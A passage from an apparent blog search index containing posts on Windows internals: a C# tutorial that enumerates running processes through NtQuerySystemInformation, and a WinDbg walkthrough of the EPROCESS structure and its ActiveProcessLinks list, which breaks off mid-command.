Linux.\u003c/p\u003e\n\u003cp\u003eIf we look at the source code\u003csup id=\"fnref:1\"\u003e\u003ca href=\"#fn:1\" class=\"footnote-ref\" role=\"doc-noteref\"\u003e1\u003c/a\u003e\u003c/sup\u003e to the Executable and Linkable Format specification in \u003ccode\u003eelf.h\u003c/code\u003e, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.\u003c/p\u003e","title":"Infecting Linux ELF Files"},{"content":"I\u0026rsquo;ve been somewhat mute here lately and haven\u0026rsquo;t updated my GitHub Pages in a while. However, I\u0026rsquo;ve been actively engaged in research and taking notes on a new sideblog on Blogspot.\nSo, I\u0026rsquo;ve been writing a little Rust, Python, and C# code, exploring operating system internals. And utilizing aspects of .NET to do stuff on Windows. And occasionally, I\u0026rsquo;ve been analyzing malware.\n","permalink":"https://hexagram.foo/posts/a-sideblog-on-blogspot/","summary":"\u003cp\u003eI\u0026rsquo;ve been somewhat mute here lately and haven\u0026rsquo;t updated my GitHub Pages in a while. However, I\u0026rsquo;ve been actively engaged in research and taking notes on a new \u003ca href=\"https://hexagr.blogspot.com\"\u003esideblog on Blogspot\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eSo, I\u0026rsquo;ve been writing a little Rust, Python, and C# code, \u003ca href=\"https://hexagr.blogspot.com/2023/08/portable-executable-format-and.html\"\u003eexploring\u003c/a\u003e \u003ca href=\"https://hexagr.blogspot.com/2023/08/windows-process-initialization.html\"\u003eoperating system internals\u003c/a\u003e. And \u003ca href=\"https://hexagram.foo/posts/using-c-sharp-to-enumerate-windows-processes/\"\u003eutilizing aspects of .NET to do stuff on Windows\u003c/a\u003e. And occasionally, I\u0026rsquo;ve been \u003ca href=\"https://hexagr.blogspot.com/2023/01/mm-malware-analysis.html\"\u003eanalyzing malware\u003c/a\u003e.\u003c/p\u003e","title":"A Sideblog on Blogspot"},{"content":"In previous posts, I covered how to observe process information in Windbg by starting a debugging session and dumping the Process Environment Block.\nAnd how we can view the EPROCESS structure, including a doubly linked-list of active processes via ActiveProcessLinks.\nBut in this post, we\u0026rsquo;ll discuss yet another way of gleaning information about processes in Windows, this time from another structure within the Windows ecosystem: the SYSTEM_PROCESS_INFORMATION structure.\nSYSTEM_PROCESS_INFORMATION Structure Microsoft tells us in their documentation that this structure holds various entries which hold system and process information.\nWhen the SystemInformationClass parameter is SystemProcessInformation, the buffer pointed to by the SystemInformation parameter contains a SYSTEM_PROCESS_INFORMATION structure for each process. Each of these structures is immediately followed in memory by one or more SYSTEM_THREAD_INFORMATION structures that provide info for each thread in the preceding process. For more information about SYSTEM_THREAD_INFORMATION, see the section about this structure in this article.\nThe buffer pointed to by the SystemInformation parameter should be large enough to hold an array that contains as many SYSTEM_PROCESS_INFORMATION and SYSTEM_THREAD_INFORMATION structures as there are processes and threads running in the system. This size is specified by the ReturnLength parameter.\nMicrosoft goes on to give us the following type definition for the SYSTEM_PROCESS_INFORMATION structure, which gives us access to process variables like ImageNames, UniqueProcessId, and more:\ntypedef struct _SYSTEM_PROCESS_INFORMATION { ULONG NextEntryOffset; ULONG NumberOfThreads; BYTE Reserved1[48]; UNICODE_STRING ImageName; KPRIORITY BasePriority; HANDLE UniqueProcessId; PVOID Reserved2; ULONG HandleCount; ULONG SessionId; PVOID Reserved3; SIZE_T PeakVirtualSize; SIZE_T VirtualSize; ULONG Reserved4; SIZE_T PeakWorkingSetSize; SIZE_T WorkingSetSize; PVOID Reserved5; SIZE_T QuotaPagedPoolUsage; PVOID Reserved6; SIZE_T QuotaNonPagedPoolUsage; SIZE_T PagefileUsage; SIZE_T PeakPagefileUsage; SIZE_T PrivatePageCount; LARGE_INTEGER Reserved7[6]; } SYSTEM_PROCESS_INFORMATION; NTDLL, Home of .. Many Functions In previous posts, I talked about how NTDLL.dll is where Windows user space frequently calls into in order to talk to relevant low-level parts of Windows and to do stuff in general. And this case is no exception.\nIn retrieving information from the SYSTEM_PROCESS_INFORMATION, we\u0026rsquo;ll need to communicate with NTDLL through a couple of system calls. To reach the SYSTEM_PROCESS_INFORMATION structure, we\u0026rsquo;ll need to do so through the Windows API via the QuerySystemInformation function, which Microsoft provides us with the following type definition for:\n__kernel_entry NTSTATUS NtQuerySystemInformation( [in] SYSTEM_INFORMATION_CLASS SystemInformationClass, [in, out] PVOID SystemInformation, [in] ULONG SystemInformationLength, [out, optional] PULONG ReturnLength ); Using Csharp to Talk to NTDLL We\u0026rsquo;ll translate this type definition to C# and create the following declaration to call the NtQuerySystemInformation function and access the SYSTEM_PROCESS_INFORMATION structure. Since this function resides in NTDLL, we\u0026rsquo;ll use the extern keyword to tell the compiler this.\nPVOID, a pointer to void, is an IntPtr in C#, an integer whose size is that of a pointer. This is for referencing unmanaged memory. Per Microsoft\u0026rsquo;s documentation:\nThe IntPtr type can be used by languages that support pointers and as a common means of referring to data between languages that do and do not support pointers. IntPtr objects can also be used to hold handles. For example, instances of IntPtr are used extensively in the System.IO.\nAnd SystemInformationLength is a ulong, or unsigned integer, which is a uint in C#. And ReturnLength is also a uint. So, our initial declaration looks like this:\nusing System; using System.Diagnostics; using System.Runtime.InteropServices; public class Program { [DllImport(\u0026#34;ntdll.dll\u0026#34;)] public static extern uint NtQuerySystemInformation(uint SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength); } To correctly read the outputs from the Windows API, as well as this structure, we\u0026rsquo;ll need to utilize Unicode. This signature is straightforward. We have a Length, Max Length, and Buffer. Microsoft clarifies this in their documentation:\nWhen the ProcessInformationClass parameter is ProcessImageFileName, the buffer pointed to by the ProcessInformation parameter should be large enough to hold a UNICODE_STRING structure as well as the string itself. The string stored in the Buffer member is the name of the image file.\nIf the buffer is too small, the function fails with the STATUS_INFO_LENGTH_MISMATCH error code and the ReturnLength parameter is set to the required buffer size.\nThe UNICODE_STRING signature in C# is as follows:\n[StructLayout(LayoutKind.Sequential)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; } Next, we\u0026rsquo;ll need to Marshal the unmanaged SYSTEM_PROCESS_INFORMATION structure. Microsoft provides us this type definition:\ntypedef struct _SYSTEM_PROCESS_INFORMATION { ULONG NextEntryOffset; ULONG NumberOfThreads; BYTE Reserved1[48]; UNICODE_STRING ImageName; KPRIORITY BasePriority; HANDLE UniqueProcessId; PVOID Reserved2; ULONG HandleCount; ULONG SessionId; PVOID Reserved3; SIZE_T PeakVirtualSize; SIZE_T VirtualSize; ULONG Reserved4; SIZE_T PeakWorkingSetSize; SIZE_T WorkingSetSize; PVOID Reserved5; SIZE_T QuotaPagedPoolUsage; PVOID Reserved6; SIZE_T QuotaNonPagedPoolUsage; SIZE_T PagefileUsage; SIZE_T PeakPagefileUsage; SIZE_T PrivatePageCount; LARGE_INTEGER Reserved7[6]; } SYSTEM_PROCESS_INFORMATION; But if we dig a bit deeper, we find this type definition provided by Microsoft is seemingly incomplete. Software analyst Geoff Chappell has provided a much more thorough overview of this structure.\nIf we reference Geoff Chappell\u0026rsquo;s documentation, we see the SYSTEM_PROCESS_INFORMATION structure actually includes many attributes that Microsoft doesn\u0026rsquo;t officially list.\nSo, here we\u0026rsquo;ll use Geoff Chappell\u0026rsquo;s analysis for reference since it provides a much more comprehensive layout of the structure.\nWe\u0026rsquo;ll once again use a C# StructLayout to Marshal this information so our program can handle it. After converting the types, our layout for the SYSTEM_PROCESS_INFORMATION structure looks like this:\n[StructLayout(LayoutKind.Sequential)] public struct SYSTEM_PROCESS_INFORMATION { public uint NextEntryOffset; public uint NumberOfThreads; public LARGE_INTEGER WorkingSetPrivateSize; public uint HardFaultCount; public uint NumberOfThreadsHighWatermark; public ulong CycleTime; public LARGE_INTEGER CreateTime; public LARGE_INTEGER UserTime; public LARGE_INTEGER KernelTime; public UNICODE_STRING ImageName; public int BasePriority; public IntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId; public uint HandleCount; public uint SessionId; public IntPtr UniqueProcessKey; public IntPtr PeakVirtualSize; public IntPtr VirtualSize; public uint PageFaultCount; public IntPtr PeakWorkingSetSize; public IntPtr WorkingSetSize; public IntPtr QuotaPeakPagedPoolUsage; public IntPtr QuotaPagedPoolUsage; public IntPtr QuotaPeakNonPagedPoolUsage; public IntPtr QuotaNonPagedPoolUsage; public IntPtr PagefileUsage; public IntPtr PeakPagefileUsage; public IntPtr PrivatePageCount; public LARGE_INTEGER ReadOperationCount; public LARGE_INTEGER WriteOperationCount; public LARGE_INTEGER OtherOperationCount; public LARGE_INTEGER ReadTransferCount; public LARGE_INTEGER WriteTransferCount; public LARGE_INTEGER OtherTransferCount; } The large_integer will need to be correctly defined too. This was used in the aforementioned documentation. And it represents a 64-bit signed integer, e.g. long QuadPart:\n[StructLayout(LayoutKind.Sequential)] public struct LARGE_INTEGER { public long QuadPart; } Next we\u0026rsquo;ll declare and initialize the variables for our function. These will all be unsigned integers with the exception of the IntPtr. dwRet will hold our return value from NtQuerySystemInformation. dwSize represents the size of the memory buffers we\u0026rsquo;ll be operating on. We\u0026rsquo;ll initialize this to zero. And dwStatus represents a default error code indicating that a length mismatch has occurred. We\u0026rsquo;ll set this as the default error status for now. And last, we\u0026rsquo;ll initialize our pointer to zero.\npublic static void Main() { uint dwRet; uint dwSize = 0x0; uint dwStatus = 0xC0000004; IntPtr p = IntPtr.Zero; } We initialize a loop where we first check if the pointer p is not zero. If it is not, we free the previously allocated memory using Marshal.FreeHGlobal(p).\nNext, we allocate memory for the buffer by using Marshal.AllocHGlobal((int)dwSize), where dwSize specifies the amount of memory needed for our result.\nAfterward, we call NtQuerySystemInformation, passing the allocated buffer p, the size of the buffer dwSize, and a variable dwRet to hold the number of bytes returned.\nIf NtQuerySystemInformation returns a status code of 0, our query was successful, and we can break the loop and process the data. If the status code is 0xC0000004, there\u0026rsquo;s a length mismatch, e.g. our buffer size wasn\u0026rsquo;t large enough to hold all the data.\nIn this case, we don\u0026rsquo;t bail out of the loop immediately but instead adjust the buffer size with dwSize = dwRet + (2 \u0026lt;\u0026lt; 12), increasing dwSize to accommodate the full result.\nIf we encounter any other error code, however, we print an error message, free the memory, and exit the loop.\nwhile (true) { if (p != IntPtr.Zero) Marshal.FreeHGlobal(p); p = Marshal.AllocHGlobal((int)dwSize); dwStatus = NtQuerySystemInformation(5, p, dwSize, out dwRet); if (dwStatus == 0) { break; } else if (dwStatus != 0xC0000004) { Marshal.FreeHGlobal(p); p = IntPtr.Zero; Console.WriteLine(\u0026#34;Data retrieval failed\u0026#34;); return; } dwSize = dwRet + (2 \u0026lt;\u0026lt; 12); } Finally, we can loop through the entries and print the attributes from the SYSTEM_PROCESS_INFORMATION structure.\nWe use Marshal.PtrToStructure to reference the unmanaged memory we\u0026rsquo;ve marshaled into the currentPtr. This allows us to map raw memory to the specific C# SYSTEM_PROCESS_INFORMATION typedef we defined earlier. C sharp\u0026rsquo;s use of static typing ensures the data is retrieved safely and with the correct types.\nvar processInfo = (SYSTEM_PROCESS_INFORMATION)Marshal.PtrToStructure(currentPtr, typeof(SYSTEM_PROCESS_INFORMATION)); And then we write out output with Console.WriteLine, checking the values of the attributes we\u0026rsquo;re referencing. If the ImageName.Buffer is non-zero, we likely have a valid ImageName. So we call Marshal.PtrToStringUni(processInfo.ImageName.Buffer) on it to get the Unicode ImageName. And to extract the UniqueProcessId, we convert the value to a Int64, a signed integer.\nAfter each record, we move to the next entry using the NextEntryOffset value. We convert this to a 32-bit integer, though. Per Microsoft\u0026rsquo;s documentation:\nNextEntryOffset (4 bytes): A 32-bit unsigned integer that MUST specify the offset, in bytes, from the current FILE_LINK_ENTRY_INFORMATION structure to the next FILE_LINK_ENTRY_INFORMATION structure. A value of 0 indicates this is the last entry structure.\nAltogether, our last bit of code will look like this:\nIntPtr currentPtr = p; do { var processInfo = (SYSTEM_PROCESS_INFORMATION)Marshal.PtrToStructure(currentPtr, typeof(SYSTEM_PROCESS_INFORMATION)); Console.WriteLine($\u0026#34;[*] Image name: {(processInfo.ImageName.Buffer != IntPtr.Zero ? Marshal.PtrToStringUni(processInfo.ImageName.Buffer) : \u0026#34;\u0026#34;)}\u0026#34;); Console.WriteLine($\u0026#34; \u0026gt; PID: {processInfo.UniqueProcessId.ToInt64()}\u0026#34;); Console.WriteLine(); // Calculate the offset to the next process entry int offset = (int)processInfo.NextEntryOffset; if (offset == 0) break; // Move to the next process entry currentPtr = IntPtr.Add(currentPtr, offset); } while (true); Marshal.FreeHGlobal(p); } On Github I\u0026rsquo;ve uploaded the C# code for this demonstration to a small repository dubbed \u0026ldquo;Cardinal.\u0026rdquo;\nAfter compiling, we can do:\n\u0026gt;.\\Cardinal\\bin\\Debug\\Cardinal.exe [*] Image name: \u0026gt; PID: 0 [*] Image name: System \u0026gt; PID: 4 [*] Image name: Registry \u0026gt; PID: 116 [*] Image name: smss.exe \u0026gt; PID: 444 [*] Image name: csrss.exe \u0026gt; PID: 636 [*] Image name: wininit.exe \u0026gt; PID: 708 ","permalink":"https://hexagram.foo/posts/using-c-sharp-to-enumerate-windows-processes/","summary":"\u003cp\u003eIn previous posts, I covered how to observe process information \u003ca href=\"https://hexagr.blogspot.com/2023/08/windows-process-initialization.html\"\u003ein Windbg by starting a debugging session and dumping the Process Environment Block\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eAnd how we can view the EPROCESS structure, including a doubly linked-list of \u003ca href=\"https://hexagram.foo/posts/finding-active-processes-with-windbg/\"\u003eactive processes via ActiveProcessLinks\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eBut in this post, we\u0026rsquo;ll discuss yet another way of gleaning information about processes in Windows, this time from another structure within the Windows ecosystem: the \u003ccode\u003eSYSTEM_PROCESS_INFORMATION\u003c/code\u003e structure.\u003c/p\u003e\n\u003ch2 id=\"system_process_information-structure\"\u003eSYSTEM_PROCESS_INFORMATION Structure\u003c/h2\u003e\n\u003cp\u003eMicrosoft tells us in their documentation that this structure holds various entries which hold system and process information.\u003c/p\u003e","title":"Using C Sharp to Enumerate Windows Processes"},{"content":"In the Windows kernel, each process is assigned an EPROCESS structure, which is a kernel object that represents a program or process. And a Process Environment Block (PEB) is just one of many structures pointed to by the EPROCESS structure. A snippet from _EPROCESS as documented on Vergilius Project:\nvolatile ULONGLONG OwnerProcessId; struct _PEB* Peb; struct _MM_SESSION_SPACE* Session; VOID* Sparel; In user space however, we cannot directly reference all of the EPROCESS structures and their data. At most, we can do something like dt nt!_EPROCESS in windbg and get a peek at the layout. We\u0026rsquo;ll have to enable kernel debugging to more closely examine things. But here\u0026rsquo;s what we can see in user mode. The EPROCESS structure is large. The entire output from windbg is as follows:\n\u0026gt; dt nt!_EPROCESS ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x438 ProcessLock : _EX_PUSH_LOCK +0x440 UniqueProcessId : Ptr64 Void +0x448 ActiveProcessLinks : _LIST_ENTRY +0x458 RundownProtect : _EX_RUNDOWN_REF +0x460 Flags2 : Uint4B +0x460 JobNotReallyActive : Pos 0, 1 Bit +0x460 AccountingFolded : Pos 1, 1 Bit +0x460 NewProcessReported : Pos 2, 1 Bit +0x460 ExitProcessReported : Pos 3, 1 Bit +0x460 ReportCommitChanges : Pos 4, 1 Bit +0x460 LastReportMemory : Pos 5, 1 Bit +0x460 ForceWakeCharge : Pos 6, 1 Bit +0x460 CrossSessionCreate : Pos 7, 1 Bit +0x460 NeedsHandleRundown : Pos 8, 1 Bit +0x460 RefTraceEnabled : Pos 9, 1 Bit +0x460 PicoCreated : Pos 10, 1 Bit +0x460 EmptyJobEvaluated : Pos 11, 1 Bit +0x460 DefaultPagePriority : Pos 12, 3 Bits +0x460 PrimaryTokenFrozen : Pos 15, 1 Bit +0x460 ProcessVerifierTarget : Pos 16, 1 Bit +0x460 RestrictSetThreadContext : Pos 17, 1 Bit +0x460 AffinityPermanent : Pos 18, 1 Bit +0x460 AffinityUpdateEnable : Pos 19, 1 Bit +0x460 PropagateNode : Pos 20, 1 Bit +0x460 ExplicitAffinity : Pos 21, 1 Bit +0x460 ProcessExecutionState : Pos 22, 2 Bits +0x460 EnableReadVmLogging : Pos 24, 1 Bit +0x460 EnableWriteVmLogging : Pos 25, 1 Bit +0x460 FatalAccessTerminationRequested : Pos 26, 1 Bit +0x460 DisableSystemAllowedCpuSet : Pos 27, 1 Bit +0x460 ProcessStateChangeRequest : Pos 28, 2 Bits +0x460 ProcessStateChangeInProgress : Pos 30, 1 Bit +0x460 InPrivate : Pos 31, 1 Bit +0x464 Flags : Uint4B +0x464 CreateReported : Pos 0, 1 Bit +0x464 NoDebugInherit : Pos 1, 1 Bit +0x464 ProcessExiting : Pos 2, 1 Bit +0x464 ProcessDelete : Pos 3, 1 Bit +0x464 ManageExecutableMemoryWrites : Pos 4, 1 Bit +0x464 VmDeleted : Pos 5, 1 Bit +0x464 OutswapEnabled : Pos 6, 1 Bit +0x464 Outswapped : Pos 7, 1 Bit +0x464 FailFastOnCommitFail : Pos 8, 1 Bit +0x464 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x464 AddressSpaceInitialized : Pos 10, 2 Bits +0x464 SetTimerResolution : Pos 12, 1 Bit +0x464 BreakOnTermination : Pos 13, 1 Bit +0x464 DeprioritizeViews : Pos 14, 1 Bit +0x464 WriteWatch : Pos 15, 1 Bit +0x464 ProcessInSession : Pos 16, 1 Bit +0x464 OverrideAddressSpace : Pos 17, 1 Bit +0x464 HasAddressSpace : Pos 18, 1 Bit +0x464 LaunchPrefetched : Pos 19, 1 Bit +0x464 Reserved : Pos 20, 1 Bit +0x464 VmTopDown : Pos 21, 1 Bit +0x464 ImageNotifyDone : Pos 22, 1 Bit +0x464 PdeUpdateNeeded : Pos 23, 1 Bit +0x464 VdmAllowed : Pos 24, 1 Bit +0x464 ProcessRundown : Pos 25, 1 Bit +0x464 ProcessInserted : Pos 26, 1 Bit +0x464 DefaultIoPriority : Pos 27, 3 Bits +0x464 ProcessSelfDelete : Pos 30, 1 Bit +0x464 SetTimerResolutionLink : Pos 31, 1 Bit +0x468 CreateTime : _LARGE_INTEGER +0x470 ProcessQuotaUsage : [2] Uint8B +0x480 ProcessQuotaPeak : [2] Uint8B +0x490 PeakVirtualSize : Uint8B +0x498 VirtualSize : Uint8B +0x4a0 SessionProcessLinks : _LIST_ENTRY +0x4b0 ExceptionPortData : Ptr64 Void +0x4b0 ExceptionPortValue : Uint8B +0x4b0 ExceptionPortState : Pos 0, 3 Bits +0x4b8 Token : _EX_FAST_REF +0x4c0 MmReserved : Uint8B +0x4c8 AddressCreationLock : _EX_PUSH_LOCK +0x4d0 PageTableCommitmentLock : _EX_PUSH_LOCK +0x4d8 RotateInProgress : Ptr64 _ETHREAD +0x4e0 ForkInProgress : Ptr64 _ETHREAD +0x4e8 CommitChargeJob : Ptr64 _EJOB +0x4f0 CloneRoot : _RTL_AVL_TREE +0x4f8 NumberOfPrivatePages : Uint8B +0x500 NumberOfLockedPages : Uint8B +0x508 Win32Process : Ptr64 Void +0x510 Job : Ptr64 _EJOB +0x518 SectionObject : Ptr64 Void +0x520 SectionBaseAddress : Ptr64 Void +0x528 Cookie : Uint4B +0x530 WorkingSetWatch : Ptr64 _PAGEFAULT_HISTORY +0x538 Win32WindowStation : Ptr64 Void +0x540 InheritedFromUniqueProcessId : Ptr64 Void +0x548 OwnerProcessId : Uint8B +0x550 Peb : Ptr64 _PEB +0x558 Session : Ptr64 _MM_SESSION_SPACE +0x560 Spare1 : Ptr64 Void +0x568 QuotaBlock : Ptr64 _EPROCESS_QUOTA_BLOCK +0x570 ObjectTable : Ptr64 _HANDLE_TABLE +0x578 DebugPort : Ptr64 Void +0x580 WoW64Process : Ptr64 _EWOW64PROCESS +0x588 DeviceMap : _EX_FAST_REF +0x590 EtwDataSource : Ptr64 Void +0x598 PageDirectoryPte : Uint8B +0x5a0 ImageFilePointer : Ptr64 _FILE_OBJECT +0x5a8 ImageFileName : [15] UChar +0x5b7 PriorityClass : UChar +0x5b8 SecurityPort : Ptr64 Void +0x5c0 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x5c8 JobLinks : _LIST_ENTRY +0x5d8 HighestUserAddress : Ptr64 Void +0x5e0 ThreadListHead : _LIST_ENTRY +0x5f0 ActiveThreads : Uint4B +0x5f4 ImagePathHash : Uint4B +0x5f8 DefaultHardErrorProcessing : Uint4B +0x5fc LastThreadExitStatus : Int4B +0x600 PrefetchTrace : _EX_FAST_REF +0x608 LockedPagesList : Ptr64 Void +0x610 ReadOperationCount : _LARGE_INTEGER +0x618 WriteOperationCount : _LARGE_INTEGER +0x620 OtherOperationCount : _LARGE_INTEGER +0x628 ReadTransferCount : _LARGE_INTEGER +0x630 WriteTransferCount : _LARGE_INTEGER +0x638 OtherTransferCount : _LARGE_INTEGER +0x640 CommitChargeLimit : Uint8B +0x648 CommitCharge : Uint8B +0x650 CommitChargePeak : Uint8B +0x680 Vm : _MMSUPPORT_FULL +0x7c0 MmProcessLinks : _LIST_ENTRY +0x7d0 ModifiedPageCount : Uint4B +0x7d4 ExitStatus : Int4B +0x7d8 VadRoot : _RTL_AVL_TREE +0x7e0 VadHint : Ptr64 Void +0x7e8 VadCount : Uint8B +0x7f0 VadPhysicalPages : Uint8B +0x7f8 VadPhysicalPagesLimit : Uint8B +0x800 AlpcContext : _ALPC_PROCESS_CONTEXT +0x820 TimerResolutionLink : _LIST_ENTRY +0x830 TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD +0x838 RequestedTimerResolution : Uint4B +0x83c SmallestTimerResolution : Uint4B +0x840 ExitTime : _LARGE_INTEGER +0x848 InvertedFunctionTable : Ptr64 _INVERTED_FUNCTION_TABLE_USER_MODE +0x850 InvertedFunctionTableLock : _EX_PUSH_LOCK +0x858 ActiveThreadsHighWatermark : Uint4B +0x85c LargePrivateVadCount : Uint4B +0x860 ThreadListLock : _EX_PUSH_LOCK +0x868 WnfContext : Ptr64 Void +0x870 ServerSilo : Ptr64 _EJOB +0x878 SignatureLevel : UChar +0x879 SectionSignatureLevel : UChar +0x87a Protection : _PS_PROTECTION +0x87b HangCount : Pos 0, 3 Bits +0x87b GhostCount : Pos 3, 3 Bits +0x87b PrefilterException : Pos 6, 1 Bit +0x87c Flags3 : Uint4B +0x87c Minimal : Pos 0, 1 Bit +0x87c ReplacingPageRoot : Pos 1, 1 Bit +0x87c Crashed : Pos 2, 1 Bit +0x87c JobVadsAreTracked : Pos 3, 1 Bit +0x87c VadTrackingDisabled : Pos 4, 1 Bit +0x87c AuxiliaryProcess : Pos 5, 1 Bit +0x87c SubsystemProcess : Pos 6, 1 Bit +0x87c IndirectCpuSets : Pos 7, 1 Bit +0x87c RelinquishedCommit : Pos 8, 1 Bit +0x87c HighGraphicsPriority : Pos 9, 1 Bit +0x87c CommitFailLogged : Pos 10, 1 Bit +0x87c ReserveFailLogged : Pos 11, 1 Bit +0x87c SystemProcess : Pos 12, 1 Bit +0x87c HideImageBaseAddresses : Pos 13, 1 Bit +0x87c AddressPolicyFrozen : Pos 14, 1 Bit +0x87c ProcessFirstResume : Pos 15, 1 Bit +0x87c ForegroundExternal : Pos 16, 1 Bit +0x87c ForegroundSystem : Pos 17, 1 Bit +0x87c HighMemoryPriority : Pos 18, 1 Bit +0x87c EnableProcessSuspendResumeLogging : Pos 19, 1 Bit +0x87c EnableThreadSuspendResumeLogging : Pos 20, 1 Bit +0x87c SecurityDomainChanged : Pos 21, 1 Bit +0x87c SecurityFreezeComplete : Pos 22, 1 Bit +0x87c VmProcessorHost : Pos 23, 1 Bit +0x87c VmProcessorHostTransition : Pos 24, 1 Bit +0x87c AltSyscall : Pos 25, 1 Bit +0x87c TimerResolutionIgnore : Pos 26, 1 Bit +0x87c DisallowUserTerminate : Pos 27, 1 Bit +0x87c EnableProcessRemoteExecProtectVmLogging : Pos 28, 1 Bit +0x87c EnableProcessLocalExecProtectVmLogging : Pos 29, 1 Bit +0x87c MemoryCompressionProcess : Pos 30, 1 Bit +0x880 DeviceAsid : Int4B +0x888 SvmData : Ptr64 Void +0x890 SvmProcessLock : _EX_PUSH_LOCK +0x898 SvmLock : Uint8B +0x8a0 SvmProcessDeviceListHead : _LIST_ENTRY +0x8b0 LastFreezeInterruptTime : Uint8B +0x8b8 DiskCounters : Ptr64 _PROCESS_DISK_COUNTERS +0x8c0 PicoContext : Ptr64 Void +0x8c8 EnclaveTable : Ptr64 Void +0x8d0 EnclaveNumber : Uint8B +0x8d8 EnclaveLock : _EX_PUSH_LOCK +0x8e0 HighPriorityFaultsAllowed : Uint4B +0x8e8 EnergyContext : Ptr64 _PO_PROCESS_ENERGY_CONTEXT +0x8f0 VmContext : Ptr64 Void +0x8f8 SequenceNumber : Uint8B +0x900 CreateInterruptTime : Uint8B +0x908 CreateUnbiasedInterruptTime : Uint8B +0x910 TotalUnbiasedFrozenTime : Uint8B +0x918 LastAppStateUpdateTime : Uint8B +0x920 LastAppStateUptime : Pos 0, 61 Bits +0x920 LastAppState : Pos 61, 3 Bits +0x928 SharedCommitCharge : Uint8B +0x930 SharedCommitLock : _EX_PUSH_LOCK +0x938 SharedCommitLinks : _LIST_ENTRY +0x948 AllowedCpuSets : Uint8B +0x950 DefaultCpuSets : Uint8B +0x948 AllowedCpuSetsIndirect : Ptr64 Uint8B +0x950 DefaultCpuSetsIndirect : Ptr64 Uint8B +0x958 DiskIoAttribution : Ptr64 Void +0x960 DxgProcess : Ptr64 Void +0x968 Win32KFilterSet : Uint4B +0x96c Machine : Uint2B +0x96e Spare0 : Uint2B +0x970 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES +0x978 KTimerSets : Uint4B +0x97c KTimer2Sets : Uint4B +0x980 ThreadTimerSets : Uint4B +0x988 VirtualTimerListLock : Uint8B +0x990 VirtualTimerListHead : _LIST_ENTRY +0x9a0 WakeChannel : _WNF_STATE_NAME +0x9a0 WakeInfo : _PS_PROCESS_WAKE_INFORMATION +0x9d0 MitigationFlags : Uint4B +0x9d0 MitigationFlagsValues : \u0026lt;unnamed-tag\u0026gt; +0x9d4 MitigationFlags2 : Uint4B +0x9d4 MitigationFlags2Values : \u0026lt;unnamed-tag\u0026gt; +0x9d8 PartitionObject : Ptr64 Void +0x9e0 SecurityDomain : Uint8B +0x9e8 ParentSecurityDomain : Uint8B +0x9f0 CoverageSamplerContext : Ptr64 Void +0x9f8 MmHotPatchContext : Ptr64 Void +0xa00 IdealProcessorAssignmentBlock : _KE_IDEAL_PROCESSOR_ASSIGNMENT_BLOCK +0xb18 DynamicEHContinuationTargetsTree : _RTL_AVL_TREE +0xb20 DynamicEHContinuationTargetsLock : _EX_PUSH_LOCK +0xb28 DynamicEnforcedCetCompatibleRanges : _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES +0xb38 DisabledComponentFlags : Uint4B +0xb3c PageCombineSequence : Int4B +0xb40 EnableOptionalXStateFeaturesLock : _EX_PUSH_LOCK +0xb48 PathRedirectionHashes : Ptr64 Uint4B +0xb50 SyscallProviderReserved : [4] Ptr64 Void +0xb70 MitigationFlags3 : Uint4B +0xb70 MitigationFlags3Values : \u0026lt;unnamed-tag\u0026gt; I won\u0026rsquo;t cover all of these entries here. But observe that near the top of the structure, we see an entry called ActiveProcessLinks, which is part of a doubly linked-list, containing forward and backwards pointers linking entries together. This EPROCESS list structure contains all the active programs. And if we enable kernel debugging, we can iterate through this list.\nIn an elevated Command Prompt, we run bcdedit -debug on and reboot the machine. And then open windbg with administrative privileges.\nIn a local kernel debug session, we can now check the PsActiveProcessHead structure and get it\u0026rsquo;s address. This is the structure that the Microsoft utility PsList walks to produce a list of active processes.\nlkd\u0026gt; x nt!PsActiveProcessHead fffff807`25e37f90 nt!PsActiveProcessHead = \u0026lt;no type information\u0026gt; Next let\u0026rsquo;s get the _LIST_ENTRY forward link (Flink) using the address from the PsActiveProcessHead structure:\nlkd\u0026gt; dt nt!_LIST_ENTRY fffff807`25e37f90 [ 0xffffc509`c5488488 - 0xffffc509`cc9d6508 ] +0x000 Flink : 0xffffc509`c5488488 _LIST_ENTRY [ 0xffffc509`c54f64c8 - 0xfffff807`25e37f90 ] +0x008 Blink : 0xffffc509`cc9d6508 _LIST_ENTRY [ 0xfffff807`25e37f90 - 0xffffc509`cbf98508 ] The second thing we need is the offset of the EPROCESS structure\u0026rsquo;s ActiveProcessLinks _LIST_ENTRY, which we can see here at 0x448:\nlkd\u0026gt; dt nt!_eprocess +0x000 Pcb : _KPROCESS +0x438 ProcessLock : _EX_PUSH_LOCK +0x440 UniqueProcessId : Ptr64 Void +0x448 ActiveProcessLinks : _LIST_ENTRY And now that we have the Flink _LIST_ENTRY address 0xffffc509`c5488488 — bringing it all together, we can get the first entry (first foward link, or flink) to the ActiveProcessLinks list, and thus the ImageFileName of the first record in the EPROCESS list. We\u0026rsquo;ll use the LIST_ENTRY address and subtract the offset of the ActiveProcessLinks value (0x448).\nWhat we\u0026rsquo;re doing here essentially is using the offset to locate the beginning of each EPROCESS record. Knowing this, we then tell the debugger we want get both the ActiveProcessLinks.flink, the forward link to the next entry in the linked list, and the ImageFileName of the current entry:\nlkd\u0026gt; dt nt!_eprocess 0xffffc509`c5488488-0x448 -y ActiveProcessLinks.flink -y ImageFileName +0x448 ActiveProcessLinks : [ 0xffffc509`c54f64c8 - 0xfffff807`25e37f90 ] +0x000 Flink : 0xffffc509`c54f64c8 _LIST_ENTRY [ 0xffffc509`c8373488 - 0xffffc509`c5488488 ] +0x5a8 ImageFileName : [15] \u0026#34;System\u0026#34; Ah, the System image file name. And we see the next flink that is referenced is 0xffffc509`c54f64c8. Let\u0026rsquo;s get the ImageFileName for that entry, too:\nlkd\u0026gt; dt nt!_eprocess 0xffffc509`c54f64c8-0x448 -y 